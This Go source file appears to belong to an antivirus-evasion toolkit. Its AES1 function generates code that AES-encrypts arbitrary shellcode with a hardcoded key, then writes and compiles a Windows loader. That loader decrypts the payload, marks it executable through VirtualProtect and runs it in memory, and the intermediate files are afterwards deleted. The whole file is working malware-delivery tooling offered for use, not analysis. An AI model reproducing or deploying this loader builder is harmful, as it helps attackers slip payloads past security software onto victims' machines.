package service

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
)

func AES1(shellcode string, fileName string) {
	fmt.Println("AES1")
	func(shellcde string) {
		code := "package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"os\"\n)\n\nconst (\n\tStdLen  = 16\n\tUUIDLen = 20\n\tiv      = \"0000000000000000\"\n)\n\nvar StdChars = []byte(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\")\n\nfunc Get_aes_key() []byte {\n\treturn NewLenChars(StdLen, StdChars)\n}\n\nfunc NewLenChars(length int, chars []byte) []byte {\n\tif length == 0 {\n\t\t_ = 1\n\t}\n\tclen := len(chars)\n\tif clen < 2 || clen > 256 {\n\t\tpanic(\"Wrong charset length for NewLenChars()\")\n\t}\n\tmaxrb := 255 - (256 % clen)\n\tb := make([]byte, length)\n\tr := make([]byte, length+(length/4))\n\ti := 0\n\tfor {\n\t\tif _, err := rand.Read(r); err != nil {\n\t\t\tpanic(\"Error reading random bytes: \" + err.Error())\n\t\t}\n\t\tfor _, rb := range r {\n\t\t\tc := int(rb)\n\t\t\tif c > maxrb {\n\t\t\t\tcontinue // Skip this number to avoid modulo bias.\n\t\t\t}\n\t\t\tb[i] = chars[c%clen]\n\t\t\ti++\n\t\t\tif i == length {\n\t\t\t\treturn b\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc PKCS5Padding(ciphertext []byte, blockSize int) []byte {\n\tpadding := blockSize - len(ciphertext)%blockSize\n\tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n\treturn append(ciphertext, padtext...)\n}\n\nfunc PKCS5UnPadding(origData []byte) []byte {\n\tlength := len(origData)\n\tunpadding := int(origData[length-1])\n\treturn origData[:(length - unpadding)]\n}\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\n\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\n\torigData := make([]byte, len(decodeBytes))\n\tblockMode.CryptBlocks(origData, decodeBytes)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc AesEncrypt(encodeBytes []byte, key []byte) (string, error) {\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\tblockSize := block.BlockSize()\n\tfmt.Println(blockSize)\n\tencodeBytes = PKCS5Padding(encodeBytes, blockSize)\n\tblockMode := cipher.NewCBCEncrypter(block, []byte(iv))\n\tcrypted := make([]byte, len(encodeBytes))\n\tblockMode.CryptBlocks(crypted, encodeBytes)\n\treturn base64.StdEncoding.EncodeToString(crypted), nil\n}\n\nfunc Write_AES_shellcde(aes_shellcode string) {\n\tstr := \"package main\\n\\nimport (\\n\\t\\\"crypto/aes\\\"\\n\\t\\\"crypto/cipher\\\"\\n\\t\\\"encoding/base64\\\"\\n\\t\\\"fmt\\\"\\n\\t\\\"syscall\\\"\\n\\t\\\"unsafe\\\"\\n)\\n\\nvar procVirtualProtect = syscall.NewLazyDLL(\\\"kernel32.dll\\\").NewProc(\\\"VirtualProtect\\\")\\n\\nvar iv = \\\"0000000000000000\\\"\\n\\nfunc VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {\\n\\tret, _, _ := procVirtualProtect.Call(\\n\\t\\tuintptr(lpAddress),\\n\\t\\tuintptr(dwSize),\\n\\t\\tuintptr(flNewProtect),\\n\\t\\tuintptr(lpflOldProtect))\\n\\treturn ret > 0\\n}\\n\\nfunc Run(sc []byte) {\\n\\tf := func() {}\\n\\tvar oldfperms uint32\\n\\tif !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {\\n\\t\\tpanic(\\\"Call to VirtualProtect failed!\\\")\\n\\t}\\n\\t**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))\\n\\tvar oldshellcodeperms uint32\\n\\tif !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {\\n\\t\\tpanic(\\\"Call to VirtualProtect failed!\\\")\\n\\t}\\n\\tf()\\n}\\n\\nfunc PKCS5UnPadding(origData []byte) []byte {\\n\\tlength := len(origData)\\n\\tunpadding := int(origData[length-1])\\n\\treturn origData[:(length - unpadding)]\\n}\\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\\n\\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\tblock, err := aes.NewCipher(key)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\\n\\torigData := make([]byte, len(decodeBytes))\\n\\tblockMode.CryptBlocks(origData, decodeBytes)\\n\\torigData = PKCS5UnPadding(origData)\\n\\treturn origData, nil\\n}\\n\\nfunc CError(err error) {\\n\\tif err != nil {\\n\\t\\tfmt.Println(err)\\n\\t\\treturn\\n\\t}\\n\\treturn\\n}\\nfunc main() {\\n\\tvar enc_key1 = \\\"zizwsxedc\\\"\\n\\tvar enc_key2 = \\\"1234567\\\"\\n\\tvar info_list = [...]string{\\\"sasa2sasas1sssaas\\\", \\\"ssssasa\\\", \\\"\" + aes_shellcode + \"\\\"}\\n\\tsc, _ := AesDecrypt(info_list[2], []byte(enc_key1+enc_key2))\\n\\tRun([]byte(sc))\\n}\"\n\tfileObj1, err := os.OpenFile(\"F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go\", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)\n\tif err != nil {\n\t\tfmt.Println(\"打开文件出 错了:\", err)\n\t\treturn\n\t}\n\tdefer fileObj1.Close()\n\twr := bufio.NewWriter(fileObj1)\n\twr.WriteString(str)\n\twr.Flush()\n}\n\nfunc main() {\n\tvar payload = []byte{" + shellcode + "}\n\tkey := \"zizwsxedc1234567\"\n\tb, _ := AesEncrypt([]byte(payload), []byte(key))\n\tfmt.Println(\"key: \" + string(key))\n\tWrite_AES_shellcde(b)\n\tfmt.Println(\"enc_info: \" + string(b))\n}"
		fileObj1, err := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644) // /aes1/aes/main.go
		if err != nil {
			fmt.Println("打开文件出错了:", err)
			return
		}
		defer fileObj1.Close()
		wr := bufio.NewWriter(fileObj1)
		wr.WriteString(code)
		wr.Flush()
	}(shellcode)
	exec.Command("go", "run", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go").Run()
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go")
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go")
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "AES1", "-f", fileName).Run()
}